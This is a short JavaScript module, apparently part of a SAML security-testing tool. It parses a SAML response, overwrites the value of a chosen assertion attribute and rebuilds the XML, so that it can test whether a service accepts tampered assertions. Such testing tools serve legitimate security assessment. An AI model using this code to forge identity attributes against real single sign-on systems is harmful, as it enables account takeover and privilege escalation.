const parseString = require('xml2js').parseString
const xml2js = require('xml2js')

const ModifyAttack = async (saml_response, assertion_attribute, modified_field) => {
  const invalid_input = isInputInvalid(saml_response, assertion_attribute, modified_field)
  if (invalid_input) {
    throw invalid_input
  }

  let parsed
  await parseString(saml_response, (err, result) => {
    if (err) {
      throw 'Invalid Saml Response'
    }
    const assertion = result['samlp:Response']['saml:Assertion'][0]['saml:AttributeStatement']
    const attribute = assertion[0]['saml:Attribute'].find(obj => {
      return obj.$.Name === assertion_attribute
    })
    if (!attribute) {
      parsed = null
      return
    }
    attribute['saml:AttributeValue'][0]._ = modified_field
    parsed = new xml2js.Builder({ headless: true }).buildObject(result)
  })

  if (!parsed) {
    throw 'Saml Attribute Miss'
  }
  return parsed
}

const isInputInvalid = (saml_response, assertion_attribute, modified_field) => {
  if (!saml_response) {
    return 'Invalid Saml Response'
  }

  if (!assertion_attribute) {
    return 'Invalid Assertion Attribute'
  }

  if (!modified_field) {
    return 'Invalid Modified Field'
  }
}
module.exports = ModifyAttack
